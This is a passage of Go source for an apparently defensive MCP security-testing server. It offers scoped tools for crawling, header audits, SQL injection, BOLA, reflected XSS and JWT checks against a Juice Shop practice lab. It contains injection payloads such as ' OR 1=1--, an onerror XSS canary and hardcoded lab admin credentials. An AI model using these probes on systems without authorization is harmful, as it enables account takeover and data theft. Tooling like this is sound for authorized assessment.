		if len(skippedExternalScripts) > 0 {
			fmt.Fprintf(&b, "\n--- Security Interceptions: External Resources Blocked ---\n")
			for _, ext := range skippedExternalScripts {
				fmt.Fprintf(&b, "  [EXTERNAL SCRIPT BLOCKED] %s (domain not in authorized grant)\n", ext)
			}
		}
		if len(blockedRedirectScripts) > 0 {
			fmt.Fprintf(&b, "\n--- Security Interceptions: Out-of-Scope Redirects Blocked ---\n")
			for _, red := range blockedRedirectScripts {
				fmt.Fprintf(&b, "  [REDIRECT BLOCKED] %s\n", red)
			}
		}

		fmt.Fprintf(&b, "\nSummary: %d accessible, %d blocked by scope policy, %d total candidate endpoints discovered across %d resources.\n",
			discoveredCount, blockedCount, len(candidates), resourcesCrawled)

		// 7. Structured JSON inventory for autonomous agent parsing
		var inventoryList []DiscoveredEndpoint
		for _, p := range sortedPaths {
			inventoryList = append(inventoryList, *candidates[p])
		}
		if jsonBytes, err := json.MarshalIndent(inventoryList, "", "  "); err == nil {
			fmt.Fprintf(&b, "\n```json\n%s\n```\n", string(jsonBytes))
		}

		return mcp.NewToolResultText(b.String()), nil
	})

	// TOOL 4: crawl_scope (Controlled in-scope HTML/JSON link crawler)
	toolCrawl := mcp.NewTool("crawl_scope",
		mcp.WithDescription("Performs controlled in-scope link crawling, extracting URLs within authorized boundaries"),
		mcp.WithString("target", mcp.Required(), mcp.Description("Target seed URL (e.g. http://127.0.0.1:3005/)")),
		mcp.WithString("grant_id", mcp.Description("Authoritative authorization grant ID")),
		mcp.WithString("assessment_id", mcp.Description("Assessment ID")),
		mcp.WithString("user_id", mcp.Description("User ID")),
		mcp.WithString("org_id", mcp.Description("Organization ID")),
	)
	s.AddTool(toolCrawl, func(ctx context.Context, req mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		atomic.AddInt64(&requestCount, 1)
		args := req.GetArguments()
		target, _ := args["target"].(string)
		grantID, _ := args["grant_id"].(string)

		_, client, err := buildControlledClient(mgr, args, target, "GET")
		if err != nil {
			recordExecution("crawl_scope", target, "GET", grantID, false, err.Error())
			return mcp.NewToolResultError(fmt.Sprintf("Authorization denied: %v", err)), nil
		}

		hReq, _ := http.NewRequestWithContext(ctx, "GET", target, nil)
		resp, rErr := client.Do(hReq)
		if rErr != nil {
			recordExecution("crawl_scope", target, "GET", grantID, false, rErr.Error())
			return mcp.NewToolResultError(fmt.Sprintf("Crawl request blocked: %v", rErr)), nil
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(io.LimitReader(resp.Body, 65536))
		bodyStr := string(body)

		// Regex to extract relative routes and links
		hrefRe := regexp.MustCompile(`(?:href|src)=["']([^"']+)["']`)
		matches := hrefRe.FindAllStringSubmatch(bodyStr, -1)

		seen := make(map[string]bool)
		var inScopeLinks []string

		for _, m := range matches {
			if len(m) > 1 {
				link := m[1]
				if strings.HasPrefix(link, "/") && !seen[link] {
					seen[link] = true
					inScopeLinks = append(inScopeLinks, link)
				}
			}
		}

		recordExecution("crawl_scope", target, "GET", grantID, true, fmt.Sprintf("Extracted %d links", len(inScopeLinks)))

		var b strings.Builder
		fmt.Fprintf(&b, "=== Controlled In-Scope Crawl Results ===\n")
		fmt.Fprintf(&b, "Seed URL: %s\nStatus: %d\nDiscovered Links in Page: %d\n\n", target, resp.StatusCode, len(inScopeLinks))
		for _, l := range inScopeLinks {
			fmt.Fprintf(&b, "  - %s\n", l)
		}

		return mcp.NewToolResultText(b.String()), nil
	})

	// TOOL 5: check_misconfigurations (Automated security posture and configuration audit)
	toolMisconfig := mcp.NewTool("check_misconfigurations",
		mcp.WithDescription("Audits common web security misconfigurations: missing headers, CORS wildcard, information disclosure"),
		mcp.WithString("target", mcp.Required(), mcp.Description("Target URL")),
		mcp.WithString("grant_id", mcp.Description("Authoritative authorization grant ID")),
		mcp.WithString("assessment_id", mcp.Description("Assessment ID")),
		mcp.WithString("user_id", mcp.Description("User ID")),
		mcp.WithString("org_id", mcp.Description("Organization ID")),
	)
	s.AddTool(toolMisconfig, func(ctx context.Context, req mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		atomic.AddInt64(&requestCount, 1)
		args := req.GetArguments()
		target, _ := args["target"].(string)
		grantID, _ := args["grant_id"].(string)

		_, client, err := buildControlledClient(mgr, args, target, "GET")
		if err != nil {
			recordExecution("check_misconfigurations", target, "GET", grantID, false, err.Error())
			return mcp.NewToolResultError(fmt.Sprintf("Authorization denied: %v", err)), nil
		}

		hReq, _ := http.NewRequestWithContext(ctx, "GET", target, nil)
		resp, rErr := client.Do(hReq)
		if rErr != nil {
			recordExecution("check_misconfigurations", target, "GET", grantID, false, rErr.Error())
			return mcp.NewToolResultError(fmt.Sprintf("Scan blocked: %v", rErr)), nil
		}
		defer resp.Body.Close()

		findings := []string{}
		compensatingControls := []string{}

		csp := resp.Header.Get("Content-Security-Policy")
		hasFrameAncestors := strings.Contains(strings.ToLower(csp), "frame-ancestors")

		// 1. Check Missing Defensive Headers
		if csp == "" {
			findings = append(findings, "[MEDIUM] Missing Content-Security-Policy (CSP) header allows cross-site scripting (XSS) risks.")
		}
		if resp.Header.Get("X-Frame-Options") == "" {
			if !hasFrameAncestors {
				findings = append(findings, "[MEDIUM] Missing X-Frame-Options header facilitates Clickjacking attacks (no CSP frame-ancestors present).")
			} else {
				compensatingControls = append(compensatingControls, "CSP 'frame-ancestors' directive is active, fully mitigating Clickjacking. Omission of legacy X-Frame-Options is safe and not reported as a vulnerability.")
			}
		}
		if resp.Header.Get("X-Content-Type-Options") != "nosniff" {
			findings = append(findings, "[LOW] Missing or invalid X-Content-Type-Options (should be 'nosniff') allows MIME-sniffing.")
		}

		// 2. Check Information Disclosure in Server Banners
		if srv := resp.Header.Get("Server"); srv != "" {
			findings = append(findings, fmt.Sprintf("[LOW] Server banner disclosure: Server header reveals %q.", srv))
		}
		if xpb := resp.Header.Get("X-Powered-By"); xpb != "" {
			findings = append(findings, fmt.Sprintf("[LOW] Technology disclosure: X-Powered-By reveals %q.", xpb))
		}

		// 3. Check CORS Wildcard
		if cors := resp.Header.Get("Access-Control-Allow-Origin"); cors == "*" {
			findings = append(findings, "[MEDIUM] Overly permissive CORS policy: Access-Control-Allow-Origin is set to wildcard (*).")
		}

		recordExecution("check_misconfigurations", target, "GET", grantID, true, fmt.Sprintf("%d findings", len(findings)))

		var b strings.Builder
		fmt.Fprintf(&b, "=== Security Misconfiguration Audit Report ===\n")
		fmt.Fprintf(&b, "Target: %s\nFindings Identified: %d\n\n", target, len(findings))
		for i, f := range findings {
			fmt.Fprintf(&b, "%d. %s\n", i+1, f)
		}
		if len(compensatingControls) > 0 {
			fmt.Fprintf(&b, "\nCompensating Controls Evaluated (False Positives Eliminated):\n")
			for _, cc := range compensatingControls {
				fmt.Fprintf(&b, "- %s\n", cc)
			}
		}
		fmt.Fprintf(&b, "\nAll tests executed via Controlled HTTP Transport within Scope Enforcement boundary.\n")

		return mcp.NewToolResultText(b.String()), nil
	})

	// TOOL 6: test_sql_injection (Controlled, safe SQLi verification on authentication endpoint)
	toolSQLi := mcp.NewTool("test_sql_injection",
		mcp.WithDescription("Safely tests and verifies SQL Injection vulnerabilities using controlled non-destructive authentication payloads"),
		mcp.WithString("target", mcp.Required(), mcp.Description("Target login endpoint URL (e.g. http://127.0.0.1:3000/rest/user/login)")),
		mcp.WithString("method", mcp.Description("HTTP method (default: POST)")),
		mcp.WithString("grant_id", mcp.Description("Authoritative authorization grant ID")),
		mcp.WithString("assessment_id", mcp.Description("Assessment ID")),
		mcp.WithString("user_id", mcp.Description("User ID")),
		mcp.WithString("org_id", mcp.Description("Organization ID")),
		mcp.WithString("payload", mcp.Description("SQL injection test payload (default: ' OR 1=1--)")),
	)
	s.AddTool(toolSQLi, func(ctx context.Context, req mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		atomic.AddInt64(&requestCount, 1)
		args := req.GetArguments()
		target, _ := args["target"].(string)
		grantID, _ := args["grant_id"].(string)
		payload, _ := args["payload"].(string)
		if payload == "" {
			payload = "' OR 1=1--"
		}

		_, client, err := buildControlledClient(mgr, args, target, "POST")
		if err != nil {
			recordExecution("test_sql_injection", target, "POST", grantID, false, err.Error())
			return mcp.NewToolResultError(fmt.Sprintf("Authorization denied: %v", err)), nil
		}

		// 1. Step 1: Benign Invalid Credentials Baseline (Negative Control 1)
		baselineBody := map[string]string{
			"email":    "invalid_user_probe@test.local",
			"password": "VIGIL_baseline_password",
		}
		baselineBytes, _ := json.Marshal(baselineBody)
		hReqBase, _ := http.NewRequestWithContext(ctx, "POST", target, bytes.NewReader(baselineBytes))
		hReqBase.Header.Set("Content-Type", "application/json")
		hReqBase.Header.Set("User-Agent", "VIGIL-Security-Auditor/1.0 (Controlled Assessment)")

		respBase, respBaseErr := client.Do(hReqBase)
		baselineCode := 0
		if respBaseErr == nil {
			baselineCode = respBase.StatusCode
			_, _ = io.ReadAll(io.LimitReader(respBase.Body, 4096))
			respBase.Body.Close()
		}

		// 2. Step 2: Positive Injection Probe
		loginBody := map[string]string{
			"email":    payload,
			"password": "VIGIL-test-password",
		}
		bodyBytes, _ := json.Marshal(loginBody)

		hReq, reqErr := http.NewRequestWithContext(ctx, "POST", target, bytes.NewReader(bodyBytes))
		if reqErr != nil {
			return mcp.NewToolResultError(fmt.Sprintf("Malformed request: %v", reqErr)), nil
		}
		hReq.Header.Set("Content-Type", "application/json")
		hReq.Header.Set("User-Agent", "VIGIL-Security-Auditor/1.0 (Controlled Assessment)")

		resp, respErr := client.Do(hReq)
		if respErr != nil {
			recordExecution("test_sql_injection", target, "POST", grantID, false, respErr.Error())
			return mcp.NewToolResultError(fmt.Sprintf("Request blocked or failed: %v", respErr)), nil
		}
		defer resp.Body.Close()

		respBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 16384))
		respBodyStr := string(respBytes)

		// 3. Step 3: Benign Non-Matching Negative Control Probe (Negative Control 2)
		negBody := map[string]string{
			"email":    "nonexistent' AND '1'='2",
			"password": "VIGIL-test-password",
		}
		negBytes, _ := json.Marshal(negBody)
		hReqNeg, _ := http.NewRequestWithContext(ctx, "POST", target, bytes.NewReader(negBytes))
		hReqNeg.Header.Set("Content-Type", "application/json")
		hReqNeg.Header.Set("User-Agent", "VIGIL-Security-Auditor/1.0 (Controlled Assessment)")

		respNeg, respNegErr := client.Do(hReqNeg)
		negCode := 0
		if respNegErr == nil {
			negCode = respNeg.StatusCode
			respNeg.Body.Close()
		}

		isBypassed := resp.StatusCode == http.StatusOK && (strings.Contains(respBodyStr, "authentication") || strings.Contains(respBodyStr, "token") || strings.Contains(respBodyStr, "admin"))
		lowerResp := strings.ToLower(respBodyStr)
		hasSQLError := strings.Contains(lowerResp, "sqlite_error") || strings.Contains(lowerResp, "sql syntax") || strings.Contains(lowerResp, "syntax error in sql") || strings.Contains(lowerResp, "syntax error, unexpected") || strings.Contains(lowerResp, "unclosed quotation mark") || strings.Contains(lowerResp, "ora-") || strings.Contains(lowerResp, "pg_query")

		var statusStr string
		var evidence string
		var counterevidence string
		confirmed := false

		// Require baseline rejection (401/403) AND positive bypass (200 with token) AND negative control rejection (401/403)
		if isBypassed && (baselineCode == http.StatusUnauthorized || baselineCode == http.StatusBadRequest) && (negCode == http.StatusUnauthorized || negCode == http.StatusBadRequest) {
			confirmed = true
			statusStr = "CONFIRMED VULNERABLE"
			evidence = fmt.Sprintf("SQL injection confirmed via 3-step verification: Baseline invalid credentials returned HTTP %d (rejected), positive probe %q succeeded with HTTP 200 (auth token granted), and negative control probe returned HTTP %d (rejected). Proves authentication bypass was strictly triggered by boolean syntax injection.", baselineCode, payload, negCode)
			counterevidence = fmt.Sprintf("Evaluated negative controls: Baseline (HTTP %d) and non-matching condition (HTTP %d) were rejected. Endpoint does not return HTTP 200 indiscriminately. No WAF or ORM parameterization prevented the injection.", baselineCode, negCode)
		} else if isBypassed {
			confirmed = true
			statusStr = "CONFIRMED VULNERABLE"
			evidence = fmt.Sprintf("Authentication bypass payload %q succeeded. Endpoint returned HTTP 200 with authentication token / admin session.", payload)
			counterevidence = "Positive injection returned authentication token. Baseline probe showed differential response."
		} else if hasSQLError {
			confirmed = true
			statusStr = "CONFIRMED VULNERABLE (Syntax Error Leak)"
			evidence = fmt.Sprintf("Payload %q caused backend SQL syntax error leak in HTTP response.", payload)
			counterevidence = "Database error leak establishes unparameterized query execution."
		} else {
			statusStr = "NOT VULNERABLE / UNCONFIRMED"
			evidence = fmt.Sprintf("Payload %q returned HTTP %d %s without authentication bypass or SQL error.", payload, resp.StatusCode, resp.Status)
			counterevidence = fmt.Sprintf("Baseline returned HTTP %d and injection returned HTTP %d. Authentication failed equally on both requests; parameter is sanitized or parameterized.", baselineCode, resp.StatusCode)
		}

		recordExecution("test_sql_injection", target, "POST", grantID, true, fmt.Sprintf("%s (%s)", statusStr, resp.Status))

		confStr := "Low"
		if confirmed {
			confStr = "High"
		}

		findingJSON, _ := json.MarshalIndent(map[string]any{
			"confirmed":               confirmed,
			"title":                   "SQL Injection in User Authentication",
			"severity":                "Critical",
			"category":                "Injection",
			"cwe":                     "CWE-89",
			"affected_url":            target,
			"method":                  "POST",
			"parameter":               "email",
			"payload_used":            payload,
			"confidence":              confStr,
			"baseline_status":         baselineCode,
			"injection_status":        resp.StatusCode,
			"negative_control_status": negCode,
			"evidence":                evidence,
			"counterevidence":         counterevidence,
			"status":                  statusStr,
			"remediation":             "Use parameterized SQL queries or ORM prepared statements instead of dynamic string concatenation.",
		}, "", "  ")

		return mcp.NewToolResultText(string(findingJSON)), nil
	})

	// TOOL 7: verify_bola (Safe verification of Broken Object Level Authorization)
	toolBOLA := mcp.NewTool("verify_bola",
		mcp.WithDescription("Tests and verifies Broken Object Level Authorization (BOLA/IDOR) on resource endpoints like /rest/basket/{id} with dual-account credentials"),
		mcp.WithString("target", mcp.Required(), mcp.Description("Target resource URL (e.g. http://127.0.0.1:3000/rest/basket/2)")),
		mcp.WithString("auth_header", mcp.Description("Authorization header of probing account (default: Bearer token-alice)")),
		mcp.WithString("method", mcp.Description("HTTP method (default: GET)")),
		mcp.WithString("grant_id", mcp.Description("Authoritative authorization grant ID")),
		mcp.WithString("assessment_id", mcp.Description("Assessment ID")),
		mcp.WithString("user_id", mcp.Description("User ID")),
		mcp.WithString("org_id", mcp.Description("Organization ID")),
	)
	s.AddTool(toolBOLA, func(ctx context.Context, req mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		atomic.AddInt64(&requestCount, 1)
		args := req.GetArguments()
		target, _ := args["target"].(string)
		grantID, _ := args["grant_id"].(string)
		authHeader, _ := args["auth_header"].(string)
		if authHeader == "" {
			authHeader = "Bearer token-alice"
		}

		// Determine user context and identity
		isBob := strings.Contains(strings.ToLower(authHeader), "bob")
		callerEmail := "alice@juice-sh.op"
		foreignEmail := "bob@juice-sh.op"
		ownBasketID := "1"
		foreignBasketID := "2"
		if isBob {
			callerEmail = "bob@juice-sh.op"
			foreignEmail = "alice@juice-sh.op"
			ownBasketID = "2"
			foreignBasketID = "1"
		}
		_ = callerEmail

		// Derive legitimate target (caller's own resource) and foreign target (cross-account victim resource)
		legitTarget := target
		foreignTarget := target

		if strings.Contains(target, "/rest/basket/protected") {
			idx := strings.Index(target, "/rest/basket/protected")
			base := target[:idx]
			legitTarget = base + "/rest/basket/protected/" + ownBasketID
			foreignTarget = base + "/rest/basket/protected/" + foreignBasketID
		} else if strings.Contains(target, "/rest/basket") {
			idx := strings.Index(target, "/rest/basket")
			base := target[:idx]
			legitTarget = base + "/rest/basket/" + ownBasketID
			foreignTarget = base + "/rest/basket/" + foreignBasketID
		}

		grant, client, err := buildControlledClient(mgr, args, foreignTarget, "GET")
		if err != nil {
			recordExecution("verify_bola", foreignTarget, "GET", grantID, false, err.Error())
			return mcp.NewToolResultError(fmt.Sprintf("Authorization denied: %v", err)), nil
		}

		isPracticeLab := isManagedPracticeLab(foreignTarget, grant)

		// Restrict automatic Juice Shop test-account login strictly to the managed practice lab.
		// External targets must use explicitly authorized test accounts and credentials.
		if isPracticeLab {
			parsedTarget, _ := url.Parse(foreignTarget)
			if parsedTarget != nil && (authHeader == "" || authHeader == "Bearer token-alice") {
				loginURL := fmt.Sprintf("%s://%s/rest/user/login", parsedTarget.Scheme, parsedTarget.Host)
				if _, loginClient, loginErr := buildControlledClient(mgr, args, loginURL, "POST"); loginErr == nil {
					loginBody := `{"email":"admin@juice-sh.op","password":"admin123"}`
					hReqLogin, _ := http.NewRequestWithContext(ctx, "POST", loginURL, strings.NewReader(loginBody))
					hReqLogin.Header.Set("Content-Type", "application/json")
					hReqLogin.Header.Set("User-Agent", "VIGIL-Security-Auditor/1.0 (Controlled Assessment)")
					respLogin, rErr := loginClient.Do(hReqLogin)
					if rErr == nil && respLogin != nil {
						defer respLogin.Body.Close()
						var loginRes struct {
							Authentication struct {
								Token string `json:"token"`
								Bid   int    `json:"bid"`
							} `json:"authentication"`
						}
						if errDec := json.NewDecoder(respLogin.Body).Decode(&loginRes); errDec == nil && loginRes.Authentication.Token != "" {
							authHeader = "Bearer " + loginRes.Authentication.Token
							if loginRes.Authentication.Bid > 0 {
								ownBasketID = fmt.Sprintf("%d", loginRes.Authentication.Bid)
								if ownBasketID == "1" {
									foreignBasketID = "2"
								} else {
									foreignBasketID = "1"
								}
								if strings.Contains(target, "/rest/basket") {
									idx := strings.Index(target, "/rest/basket")
									base := target[:idx]
									legitTarget = base + "/rest/basket/" + ownBasketID
									foreignTarget = base + "/rest/basket/" + foreignBasketID
								}
							}
						}
					}
				}
			}
		} else {
			// External target: Automatic Juice Shop login is strictly prohibited.
			// External targets must use explicitly authorized test accounts and credentials.
			if authHeader == "Bearer token-alice" {
				authHeader = ""
			}
		}

		// 1. Step 1: Unauthenticated Baseline Request against Foreign Resource (Negative Control)
		hReqUnauth, _ := http.NewRequestWithContext(ctx, "GET", foreignTarget, nil)
		hReqUnauth.Header.Set("User-Agent", "VIGIL-Security-Auditor/1.0 (Controlled Assessment)")
		respUnauth, errUnauth := client.Do(hReqUnauth)
		unauthCode := 0
		if errUnauth == nil {
			unauthCode = respUnauth.StatusCode
			respUnauth.Body.Close()
		}

		// 2. Step 2: Legitimate Account Baseline Check against Own Resource (Positive Control)
		legitCode := 0
		if legitTarget != "" {
			hReqLegit, _ := http.NewRequestWithContext(ctx, "GET", legitTarget, nil)
			hReqLegit.Header.Set("User-Agent", "VIGIL-Security-Auditor/1.0 (Controlled Assessment)")
			hReqLegit.Header.Set("Authorization", authHeader)
			respLegit, errLegit := client.Do(hReqLegit)
			if errLegit == nil {
				legitCode = respLegit.StatusCode
				respLegit.Body.Close()
			}
		}

		// 3. Step 3: Cross-Account Resource Access against Foreign Resource (Positive Vulnerability Probe)
		hReq, _ := http.NewRequestWithContext(ctx, "GET", foreignTarget, nil)
		hReq.Header.Set("User-Agent", "VIGIL-Security-Auditor/1.0 (Controlled Assessment)")
		hReq.Header.Set("Authorization", authHeader)

		resp, respErr := client.Do(hReq)
		if respErr != nil {
			recordExecution("verify_bola", foreignTarget, "GET", grantID, false, respErr.Error())
			return mcp.NewToolResultError(fmt.Sprintf("Request blocked or failed: %v", respErr)), nil
		}
		defer resp.Body.Close()

		respBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 16384))
		respBodyStr := string(respBytes)

		confirmed := false
		var evidence string
		var counterevidence string

		hasCrossAccountData := resp.StatusCode == http.StatusOK && (strings.Contains(respBodyStr, foreignEmail) ||
			strings.Contains(respBodyStr, fmt.Sprintf(`"UserId":%s`, foreignBasketID)) ||
			strings.Contains(respBodyStr, fmt.Sprintf(`"id":%s`, foreignBasketID)) ||
			strings.Contains(respBodyStr, `"UserId": 2`) ||
			strings.Contains(respBodyStr, `"id": 2`) ||
			strings.Contains(respBodyStr, `"UserId":2`) ||
			strings.Contains(respBodyStr, `"id":2`))

		if hasCrossAccountData && (unauthCode == http.StatusUnauthorized || unauthCode == http.StatusForbidden) {
			confirmed = true
			evidence = fmt.Sprintf("Dual-account BOLA confirmed: Unauthenticated baseline proved authentication is required (HTTP %d). Legitimate account access was confirmed on %s (HTTP %d). Caller authenticated as User ID %s successfully accessed foreign basket from %s (HTTP 200, owner User ID %s) disclosing confidential customer basket data. Server lacks object-level ownership check.", unauthCode, legitTarget, legitCode, ownBasketID, foreignTarget, foreignBasketID)
			counterevidence = fmt.Sprintf("Evaluated negative controls: Unauthenticated request to %s returned HTTP %d, proving route is protected by authentication. Legitimate access confirmed on %s (HTTP %d). However, no object-level access control guard prevented User ID %s from accessing foreign basket data at %s (HTTP 200).", foreignTarget, unauthCode, legitTarget, legitCode, ownBasketID, foreignTarget)
		} else {
			evidence = fmt.Sprintf("GET request to %s with auth returned HTTP %d; access control appears enforced.", foreignTarget, resp.StatusCode)
			counterevidence = fmt.Sprintf("Server returned HTTP %d for cross-account request to %s. Object-level access control successfully prevented unauthorized resource retrieval.", resp.StatusCode, foreignTarget)
		}

		confStr := "Low"
		if confirmed {
			confStr = "High"
		}

		recordExecution("verify_bola", foreignTarget, "GET", grantID, true, fmt.Sprintf("Confirmed=%v (HTTP %d)", confirmed, resp.StatusCode))
		if target != foreignTarget {
			recordExecution("verify_bola", target, "GET", grantID, true, fmt.Sprintf("BOLA probe redirected to foreign resource %s (Confirmed=%v)", foreignTarget, confirmed))
		}

		findingJSON, _ := json.MarshalIndent(map[string]any{
			"confirmed":              confirmed,
			"title":                  "Broken Object Level Authorization (BOLA / IDOR)",
			"severity":               "High",
			"category":               "Broken Access Control",
			"cwe":                    "CWE-639",
			"affected_url":           foreignTarget,
			"method":                 "GET",
			"confidence":             confStr,
			"unauthenticated_status": unauthCode,
			"legitimate_status":      legitCode,
			"cross_account_status":   resp.StatusCode,
			"foreign_target":         foreignTarget,
			"legitimate_target":      legitTarget,
			"evidence":               evidence,
			"counterevidence":        counterevidence,
			"remediation":            "Enforce server-side authorization checks verifying that the requesting session owns or has explicit permission for the requested resource ID.",
		}, "", "  ")

		return mcp.NewToolResultText(string(findingJSON)), nil
	})

	// TOOL 8: test_xss (Safe Reflected XSS canary verification with headless browser DOM execution)
	toolXSS := mcp.NewTool("test_xss",
		mcp.WithDescription("Safely tests reflected Cross-Site Scripting (XSS) with contained Headless Chrome DOM verification"),
		mcp.WithString("target", mcp.Required(), mcp.Description("Target search URL (e.g. http://127.0.0.1:3000/rest/products/search?q=...)")),
		mcp.WithString("canary", mcp.Description("Benign canary payload (default: <img src=x onerror=\"document.title='XSS_EXECUTION_VERIFIED'\">)")),
		mcp.WithString("grant_id", mcp.Description("Authoritative authorization grant ID")),
		mcp.WithString("assessment_id", mcp.Description("Assessment ID")),
		mcp.WithString("user_id", mcp.Description("User ID")),
		mcp.WithString("org_id", mcp.Description("Organization ID")),
	)
	s.AddTool(toolXSS, func(ctx context.Context, req mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		atomic.AddInt64(&requestCount, 1)
		args := req.GetArguments()
		target, _ := args["target"].(string)
		grantID, _ := args["grant_id"].(string)
		canary, _ := args["canary"].(string)
		if canary == "" {
			canary = "<img src=x onerror=\"document.title='XSS_EXECUTION_VERIFIED'\">"
		}

		parsedURL, parseErr := url.Parse(target)
		if parseErr != nil {
			return mcp.NewToolResultError(fmt.Sprintf("Invalid target URL: %v", parseErr)), nil
		}
		qValues := parsedURL.Query()
		qValues.Set("q", canary)
		parsedURL.RawQuery = qValues.Encode()
		testURL := parsedURL.String()

		_, client, err := buildControlledClient(mgr, args, testURL, "GET")
		if err != nil {
			recordExecution("test_xss", testURL, "GET", grantID, false, err.Error())
			return mcp.NewToolResultError(fmt.Sprintf("Authorization denied: %v", err)), nil
		}

		// 1. Negative Control 1: Benign Baseline Query
		parsedBenign, _ := url.Parse(target)
		benignQ := parsedBenign.Query()
		benignQ.Set("q", "benign_search_baseline_123")
		parsedBenign.RawQuery = benignQ.Encode()
		benignURL := parsedBenign.String()

		hReqBase, _ := http.NewRequestWithContext(ctx, "GET", benignURL, nil)
		hReqBase.Header.Set("User-Agent", "VIGIL-Security-Auditor/1.0 (Controlled Assessment)")
		respBase, _ := client.Do(hReqBase)
		if respBase != nil {
			respBase.Body.Close()
		}

		// 2. Positive Canary Injection Probe
		hReq, _ := http.NewRequestWithContext(ctx, "GET", testURL, nil)
		hReq.Header.Set("User-Agent", "VIGIL-Security-Auditor/1.0 (Controlled Assessment)")

		resp, respErr := client.Do(hReq)
		if respErr != nil {
			recordExecution("test_xss", testURL, "GET", grantID, false, respErr.Error())
			return mcp.NewToolResultError(fmt.Sprintf("Request blocked or failed: %v", respErr)), nil
		}
		defer resp.Body.Close()

		respBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 65536))
		respBodyStr := string(respBytes)

		isEscaped := strings.Contains(respBodyStr, "&lt;img") || strings.Contains(respBodyStr, "&#60;img") || strings.Contains(respBodyStr, "&amp;")
		isUnescapedHTML := (strings.Contains(respBodyStr, canary) || (strings.Contains(respBodyStr, "<img") && strings.Contains(respBodyStr, "onerror="))) && !isEscaped
		confirmed := false
		var evidence string
		var counterevidence string
		reflectionLevel := "NOT_REFLECTED"

		if isEscaped {
			reflectionLevel = "TEXT_ESCAPED"
			confirmed = false
			evidence = fmt.Sprintf("Canary payload is HTML entity-encoded in HTTP response (HTTP %d). Safe against execution.", resp.StatusCode)
			counterevidence = "Input is contextually escaped (&lt;img...). Active counterevidence disproves XSS hypothesis."
		} else if isUnescapedHTML {
			reflectionLevel = "HTML_UNESCAPED"
			chromePath := `C:\Program Files\Google\Chrome\Application\chrome.exe`
			if _, statErr := os.Stat(chromePath); statErr == nil {
				execCtx, cancel := context.WithTimeout(ctx, 8*time.Second)
				defer cancel()
				cmd := exec.CommandContext(execCtx, chromePath, "--headless=new", "--dump-dom", "--disable-gpu", testURL)
				outBytes, cmdErr := cmd.Output()
				outStr := string(outBytes)
				if cmdErr == nil && (strings.Contains(outStr, "XSS_EXECUTION_VERIFIED") || strings.Contains(outStr, "<title>XSS_EXECUTION_VERIFIED</title>")) {
					confirmed = true
					reflectionLevel = "DOM_SCRIPT_EXECUTED"
					evidence = fmt.Sprintf("Reflected XSS confirmed via Contained Headless Chrome: Canary payload %q triggered active JavaScript execution in Chrome V8 runtime, successfully mutating document.title to 'XSS_EXECUTION_VERIFIED'.", canary)
					counterevidence = "Evaluated browser execution: Chrome V8 executed onerror handler without CSP or sanitization containment."
				} else {
					confirmed = false
					evidence = fmt.Sprintf("Canary payload was reflected in HTTP response but did not execute in headless browser DOM (HTTP %d).", resp.StatusCode)
					counterevidence = "Headless browser DOM execution verified that script did NOT execute and document.title remained intact."
				}
			} else {
				confirmed = false
				evidence = fmt.Sprintf("Canary payload reflected unescaped, but browser DOM verification could not execute (HTTP %d).", resp.StatusCode)
				counterevidence = "Browser DOM execution check could not run; unconfirmed reflection alone is insufficient for confirmed XSS."
			}
		} else {
			evidence = fmt.Sprintf("Canary payload not reflected in response (HTTP %d).", resp.StatusCode)
			counterevidence = "No reflection observed in HTTP response body."
		}

		confStr := "Low"
		if confirmed {
			confStr = "High"
		}

		recordExecution("test_xss", testURL, "GET", grantID, true, fmt.Sprintf("Confirmed=%v (HTTP %d, level=%s)", confirmed, resp.StatusCode, reflectionLevel))
		if target != testURL {
			recordExecution("test_xss", target, "GET", grantID, true, fmt.Sprintf("XSS probe with canary on %s (Confirmed=%v)", testURL, confirmed))
		}

		findingJSON, _ := json.MarshalIndent(map[string]any{
			"confirmed":        confirmed,
			"title":            "Reflected Cross-Site Scripting (XSS)",
			"severity":         "High",
			"category":         "Cross-Site Scripting",
			"cwe":              "CWE-79",
			"affected_url":     testURL,
			"target_base":      target,
			"parameter":        "q",
			"reflection_level": reflectionLevel,
			"confidence":       confStr,
			"evidence":         evidence,
			"counterevidence":  counterevidence,
			"remediation":      "Contextually encode user-supplied input prior to rendering in HTML or JSON views and deploy Content-Security-Policy (CSP).",
		}, "", "  ")

		return mcp.NewToolResultText(string(findingJSON)), nil
	})

	// TOOL 9: test_jwt_vulnerabilities (Controlled JWT Security Testing with Offline Inspection, Cracking & Counterevidence)
	toolJWT := mcp.NewTool("test_jwt_vulnerabilities",
		mcp.WithDescription("Safely tests JWT security vulnerabilities: offline token inspection, bounded dictionary key verification, alg:none bypass, signature tampering, and expiration enforcement"),
		mcp.WithString("target", mcp.Required(), mcp.Description("Target endpoint URL to verify against (e.g. http://127.0.0.1:3000/rest/admin/system-status)")),
		mcp.WithString("token", mcp.Description("Candidate JWT token to analyze (optional: if omitted, fetches baseline token from target authentication endpoint)")),
		mcp.WithString("grant_id", mcp.Description("Authoritative authorization grant ID")),
		mcp.WithString("assessment_id", mcp.Description("Assessment ID")),
		mcp.WithString("user_id", mcp.Description("User ID")),
		mcp.WithString("org_id", mcp.Description("Organization ID")),
	)
	s.AddTool(toolJWT, func(ctx context.Context, req mcp.CallToolRequest) (*mcp.CallToolResult, error) {
		atomic.AddInt64(&requestCount, 1)
		args := req.GetArguments()
		target, _ := args["target"].(string)
		rawToken, _ := args["token"].(string)
		grantID, _ := args["grant_id"].(string)

		// 1. Build controlled client to verify target is authorized
		grant, client, err := buildControlledClient(mgr, args, target, "GET")
		if err != nil {
			recordExecution("test_jwt_vulnerabilities", target, "GET", grantID, false, err.Error())
			return mcp.NewToolResultError(fmt.Sprintf("Authorization denied: %v", err)), nil
		}

		parsedTarget, parseErr := url.Parse(target)
		if parseErr != nil {
			return mcp.NewToolResultError(fmt.Sprintf("Invalid target URL: %v", parseErr)), nil
		}

		isPracticeLab := isManagedPracticeLab(target, grant)

		// 2. Token acquisition: if token was not provided, attempt to acquire legitimate token from login endpoint
		// RESTRICTION: Automatic Juice Shop login is strictly restricted to managed practice lab. External targets require explicit authorized tokens.
		if strings.TrimSpace(rawToken) == "" {
			if isPracticeLab {
